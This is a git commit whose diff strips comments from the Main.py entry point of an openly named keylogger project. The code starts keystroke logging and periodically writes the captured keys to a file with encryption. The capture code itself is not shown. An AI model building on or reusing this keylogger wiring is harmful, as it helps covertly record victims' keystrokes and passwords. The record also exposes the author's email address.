588b7a27bf10f2691822fed3a4c31923577ca0a5
meirp908976 <meir12345p@gmail.com>
2025-09-03 12:39:04 +0300

    Update Main.py

--- Main.py
+++ Main.py
@@ -3,19 +3,19 @@ from keylogger.KeyliggerServise.KeyloggerServise import KeyLogger
 from keylogger.writer.IWriter import FileWriter
 from keylogger.KeyLoggerManager.Manager import KeyLoggerManager
 
-# יצירת רכיבים
+
 keylogger = KeyLogger()
 keylogger.start_logging()
 writer = FileWriter()
 encryption = Encryption("IDF")
 
-# Manager
+
 manager = KeyLoggerManager(keylogger, writer, encryption, interval=5)
 manager.start()
 
 try:
     while True:
-        pass  # תוכנית רציפה, אוספת הקשות
+        pass  
 except KeyboardInterrupt:
     manager.stop()
     keylogger.stop_logging()
